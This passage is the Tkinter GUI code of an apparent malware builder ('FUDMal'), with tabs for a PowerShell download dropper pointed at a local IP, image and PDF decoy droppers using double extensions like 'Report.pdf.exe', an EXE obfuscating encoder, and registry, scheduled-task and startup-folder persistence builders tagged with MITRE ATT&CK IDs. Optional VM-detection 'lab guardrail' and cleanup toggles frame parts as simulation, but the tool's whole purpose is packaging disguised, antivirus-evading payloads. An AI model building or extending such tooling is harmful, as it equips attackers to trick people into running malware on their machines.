        t.pack(side=tk.LEFT, fill='both', expand=True)
        s = ttk.Scrollbar(f, command=t.yview)
        s.pack(side=tk.RIGHT, fill='y')
        t.config(yscrollcommand=s.set)
        return t

    # --- TAB 1: CONFIG GENERATOR (Dropper) ---
    def init_config_tab(self):
        tab = ttk.Frame(self.notebook, padding=20)
        self.notebook.add(tab, text="Dropper Gen")
        
        ttk.Label(tab, text="PowerShell Config Dropper", font=('Consolas', 14, 'bold')).pack(pady=(0,4))
        ttk.Label(tab, text="Technique: T1059.001 (PowerShell)  |  T1105 (Ingress Tool Transfer)",
                  foreground='#555', font=('Consolas', 8)).pack(pady=(0,10))
        
        self.c_url = self.add_label_entry(tab, "Source URL:", "http://192.168.146.129:8000/base.exe")
        self.c_path = self.add_label_entry(tab, "Install Path:", "Downloads\\")
        self.c_fname = self.add_label_entry(tab, "Final Filename:", "service.exe")
        
        f_delays = ttk.Frame(tab)
        f_delays.pack(fill='x', pady=5)
        ttk.Label(f_delays, text="Delay Start (s):").pack(side=tk.LEFT)
        self.c_d_start = ttk.Entry(f_delays, width=5)
        self.c_d_start.insert(0, "3")
        self.c_d_start.pack(side=tk.LEFT, padx=5)
        ttk.Label(f_delays, text="Post-DL Wait (s):").pack(side=tk.LEFT, padx=(10,0))
        self.c_d_wait = ttk.Entry(f_delays, width=5)
        self.c_d_wait.insert(0, "5")
        self.c_d_wait.pack(side=tk.LEFT, padx=5)

        self.c_vm = tk.BooleanVar(value=False)
        ttk.Checkbutton(tab, text="Enable Lab Guardrail (VM Detection)", variable=self.c_vm).pack(anchor='w', pady=10)

        ttk.Button(tab, text="GENERATE .EXE", command=self.run_config_gen).pack(fill='x', pady=10)
        self.c_log = self.create_log_area(tab)

    def run_config_gen(self):
        url = self.c_url.get()
        path = self.c_path.get()
        fname = self.c_fname.get()
        try:
            d_start = int(self.c_d_start.get())
            d_wait = int(self.c_d_wait.get())
        except:
            messagebox.showerror("Error", "Delays must be integers.")
            return

        out_path = filedialog.asksaveasfilename(defaultextension=".exe", filetypes=[("EXE", "*.exe")])
        if not out_path: return

        self.c_log.delete(1.0, tk.END)
        threading.Thread(target=LogicConfigGen.generate, 
                         args=(url, path, fname, d_start, d_wait, self.c_vm.get(), out_path, self.c_log)).start()

    # --- TAB 2: SFX BUILDER ---
    def init_sfx_tab(self):
        tab = ttk.Frame(self.notebook, padding=20)
        self.notebook.add(tab, text="SFX Builder")
        
        ttk.Label(tab, text="SFX Decoy Dropper (Img/Doc)", font=('Consolas', 14, 'bold')).pack(pady=(0,4))
        ttk.Label(tab, text="Technique: T1036.007 (Double File Extension Masquerading)",
                  foreground='#555', font=('Consolas', 8)).pack(pady=(0,10))
        
        self.s_payload = self.add_file_selector(tab, "Payload EXE:", False, [("EXE", "*.exe")])
        self.s_decoy = self.add_file_selector(tab, "Decoy File:", False, [("All", "*.*")])
        self.s_name = self.add_label_entry(tab, "Output Name:", "Cat.png.exe")
        self.s_dir = self.add_file_selector(tab, "Output Dir:", True)
        
        self.s_vm = tk.BooleanVar(value=False)
        ttk.Checkbutton(tab, text="Enable Lab Guardrail (VM Detection)", variable=self.s_vm).pack(anchor='w', pady=10)

        ttk.Button(tab, text="BUILD SFX", command=self.run_sfx).pack(fill='x', pady=10)
        self.s_log = self.create_log_area(tab)

    def run_sfx(self):
        if not all([self.s_payload.get(), self.s_decoy.get(), self.s_name.get(), self.s_dir.get()]):
            messagebox.showerror("Error", "Fill all fields.")
            return
        self.s_log.delete(1.0, tk.END)
        threading.Thread(target=LogicSFX.build,
                         args=(self.s_payload.get(), self.s_decoy.get(), self.s_name.get(), 
                               self.s_dir.get(), self.s_vm.get(), self.s_log, False)).start()

    # --- TAB 3: OBFUSCATOR ---
    def init_obfus_tab(self):
        tab = ttk.Frame(self.notebook, padding=20)
        self.notebook.add(tab, text="Obfuscator")
        
        ttk.Label(tab, text="Custom Cipher EXE Encoder", font=('Consolas', 14, 'bold')).pack(pady=(0,4))
        ttk.Label(tab, text="Technique: T1027 (Obfuscated Files or Information)",
                  foreground='#555', font=('Consolas', 8)).pack(pady=(0,10))
        
        self.o_exe = self.add_file_selector(tab, "Original EXE:", False, [("EXE", "*.exe")])
        self.o_key = self.add_label_entry(tab, "Version Key:", "1.0.0")
        self.o_name = self.add_label_entry(tab, "Output Name:", "Crypt.exe")
        self.o_dir = self.add_file_selector(tab, "Output Dir:", True)

        self.o_vm = tk.BooleanVar(value=False)
        ttk.Checkbutton(tab, text="Enable Lab Guardrail (VM Detection)", variable=self.o_vm).pack(anchor='w', pady=10)

        ttk.Button(tab, text="ENCRYPT & BUILD", command=self.run_obfus).pack(fill='x', pady=10)
        self.o_log = self.create_log_area(tab)

    def run_obfus(self):
        if not all([self.o_exe.get(), self.o_key.get(), self.o_name.get(), self.o_dir.get()]):
            messagebox.showerror("Error", "Fill all fields.")
            return
        self.o_log.delete(1.0, tk.END)
        threading.Thread(target=LogicObfuscator.build,
                         args=(self.o_exe.get(), self.o_key.get(), self.o_name.get(), 
                               self.o_dir.get(), self.o_vm.get(), self.o_log)).start()

    # --- TAB 4: PDF DROPPER ---
    def init_pdf_tab(self):
        tab = ttk.Frame(self.notebook, padding=20)
        self.notebook.add(tab, text="PDF Dropper")
        
        ttk.Label(tab, text="PDF Decoy Dropper (Req: pdf.ico)", font=('Consolas', 14, 'bold')).pack(pady=(0,4))
        ttk.Label(tab, text="Technique: T1036.007 (Double File Extension Masquerading)",
                  foreground='#555', font=('Consolas', 8)).pack(pady=(0,10))
        
        self.p_payload = self.add_file_selector(tab, "Payload EXE:", False, [("EXE", "*.exe")])
        self.p_decoy = self.add_file_selector(tab, "Decoy PDF:", False, [("PDF", "*.pdf")])
        self.p_name = self.add_label_entry(tab, "Output Name:", "Report.pdf.exe")
        self.p_dir = self.add_file_selector(tab, "Output Dir:", True)

        self.p_vm = tk.BooleanVar(value=False)
        ttk.Checkbutton(tab, text="Enable Lab Guardrail (VM Detection)", variable=self.p_vm).pack(anchor='w', pady=10)

        ttk.Button(tab, text="BUILD PDF DROPPER", command=self.run_pdf).pack(fill='x', pady=10)
        self.p_log = self.create_log_area(tab)

    def run_pdf(self):
        if not all([self.p_payload.get(), self.p_decoy.get(), self.p_name.get(), self.p_dir.get()]):
            messagebox.showerror("Error", "Fill all fields.")
            return
        if not os.path.exists("pdf.ico"):
            messagebox.showwarning("Missing Icon", "pdf.ico must be in the script directory.")
            
        self.p_log.delete(1.0, tk.END)
        threading.Thread(target=LogicSFX.build, # Reusing SFX logic with is_pdf_mode=True
                         args=(self.p_payload.get(), self.p_decoy.get(), self.p_name.get(), 
                               self.p_dir.get(), self.p_vm.get(), self.p_log, True)).start()

    # --- TAB 5: REGISTRY PERSISTENCE SIMULATOR ---
    def init_reg_persist_tab(self):
        tab = ttk.Frame(self.notebook, padding=20)
        self.notebook.add(tab, text="Reg Persist")

        ttk.Label(tab, text="Registry Run Key Persistence Sim", font=('Consolas', 14, 'bold')).pack(pady=(0,4))
        ttk.Label(tab, text="Technique: MITRE ATT&CK T1547.001 - Registry Run Keys / Startup Folder",
                  foreground='#555', font=('Consolas', 8)).pack(pady=(0,10))

        self.rp_payload = self.add_file_selector(tab, "Payload EXE:", False, [("EXE", "*.exe")])
        self.rp_key     = self.add_label_entry(tab, "Registry Key Name:", "SimPersistenceKey")
        self.rp_name    = self.add_label_entry(tab, "Output Name:", "RegPersistSim.exe")
        self.rp_dir     = self.add_file_selector(tab, "Output Dir:", True)

        self.rp_vm      = tk.BooleanVar(value=False)
        self.rp_cleanup = tk.BooleanVar(value=True)
        ttk.Checkbutton(tab, text="Enable Lab Guardrail (VM Detection)", variable=self.rp_vm).pack(anchor='w', pady=3)
        ttk.Checkbutton(tab, text="Enable Cleanup (remove key after simulation)", variable=self.rp_cleanup).pack(anchor='w', pady=3)

        ttk.Button(tab, text="BUILD SIMULATOR", command=self.run_reg_persist).pack(fill='x', pady=10)
        self.rp_log = self.create_log_area(tab)

    def run_reg_persist(self):
        if not all([self.rp_payload.get(), self.rp_key.get(), self.rp_name.get(), self.rp_dir.get()]):
            messagebox.showerror("Error", "Fill all fields.")
            return
        self.rp_log.delete(1.0, tk.END)
        threading.Thread(
            target=LogicRegistryPersistence.build,
            args=(self.rp_payload.get(), self.rp_key.get(), self.rp_name.get(),
                  self.rp_dir.get(), self.rp_vm.get(), self.rp_cleanup.get(), self.rp_log)
        ).start()

    # --- TAB 6: SCHEDULED TASK SIMULATOR ---
    def init_schtask_tab(self):
        tab = ttk.Frame(self.notebook, padding=20)
        self.notebook.add(tab, text="Sched Task")

        ttk.Label(tab, text="Scheduled Task Persistence Sim", font=('Consolas', 14, 'bold')).pack(pady=(0,4))
        ttk.Label(tab, text="Technique: MITRE ATT&CK T1053.005 - Scheduled Task/Job",
                  foreground='#555', font=('Consolas', 8)).pack(pady=(0,10))

        self.st_payload  = self.add_file_selector(tab, "Payload EXE:", False, [("EXE", "*.exe")])
        self.st_taskname = self.add_label_entry(tab, "Task Name:", "SimTaskDemo")
        self.st_trigger  = self.add_label_combobox(tab, "Trigger:", ["ONLOGON", "DAILY"], "ONLOGON")
        self.st_name     = self.add_label_entry(tab, "Output Name:", "SchedTaskSim.exe")
        self.st_dir      = self.add_file_selector(tab, "Output Dir:", True)

        self.st_vm      = tk.BooleanVar(value=False)
        self.st_cleanup = tk.BooleanVar(value=True)
        ttk.Checkbutton(tab, text="Enable Lab Guardrail (VM Detection)", variable=self.st_vm).pack(anchor='w', pady=3)
        ttk.Checkbutton(tab, text="Enable Cleanup (delete task after simulation)", variable=self.st_cleanup).pack(anchor='w', pady=3)

        ttk.Button(tab, text="BUILD SIMULATOR", command=self.run_schtask).pack(fill='x', pady=10)
        self.st_log = self.create_log_area(tab)

    def run_schtask(self):
        if not all([self.st_payload.get(), self.st_taskname.get(), self.st_name.get(), self.st_dir.get()]):
            messagebox.showerror("Error", "Fill all fields.")
            return
        self.st_log.delete(1.0, tk.END)
        threading.Thread(
            target=LogicScheduledTask.build,
            args=(self.st_payload.get(), self.st_taskname.get(), self.st_trigger.get(),
                  self.st_name.get(), self.st_dir.get(), self.st_vm.get(),
                  self.st_cleanup.get(), self.st_log)
        ).start()

    # --- TAB 7: STARTUP FOLDER SIMULATOR ---
    def init_startup_tab(self):
        tab = ttk.Frame(self.notebook, padding=20)
        self.notebook.add(tab, text="Startup Folder")

        ttk.Label(tab, text="Startup Folder Persistence Sim", font=('Consolas', 14, 'bold')).pack(pady=(0,4))
        ttk.Label(tab, text="Technique: MITRE ATT&CK T1547.001 - Startup Folder",
                  foreground='#555', font=('Consolas', 8)).pack(pady=(0,10))

        self.sf_payload = self.add_file_selector(tab, "Payload EXE:", False, [("EXE", "*.exe")])
        self.sf_name    = self.add_label_entry(tab, "Output Name:", "StartupSim.exe")
        self.sf_dir     = self.add_file_selector(tab, "Output Dir:", True)

        self.sf_vm      = tk.BooleanVar(value=False)
        self.sf_cleanup = tk.BooleanVar(value=True)
        ttk.Checkbutton(tab, text="Enable Lab Guardrail (VM Detection)", variable=self.sf_vm).pack(anchor='w', pady=3)
        ttk.Checkbutton(tab, text="Enable Cleanup (remove from startup folder after sim)", variable=self.sf_cleanup).pack(anchor='w', pady=3)

        ttk.Button(tab, text="BUILD SIMULATOR", command=self.run_startup).pack(fill='x', pady=10)
        self.sf_log = self.create_log_area(tab)

    def run_startup(self):
        if not all([self.sf_payload.get(), self.sf_name.get(), self.sf_dir.get()]):
            messagebox.showerror("Error", "Fill all fields.")
            return
        self.sf_log.delete(1.0, tk.END)
        threading.Thread(
            target=LogicStartupFolder.build,
            args=(self.sf_payload.get(), self.sf_name.get(), self.sf_dir.get(),
                  self.sf_vm.get(), self.sf_cleanup.get(), self.sf_log)
        ).start()

if __name__ == "__main__":
    app = UnifiedBuilderApp()
    app.iconbitmap("FUDMal.ico")
    app.mainloop()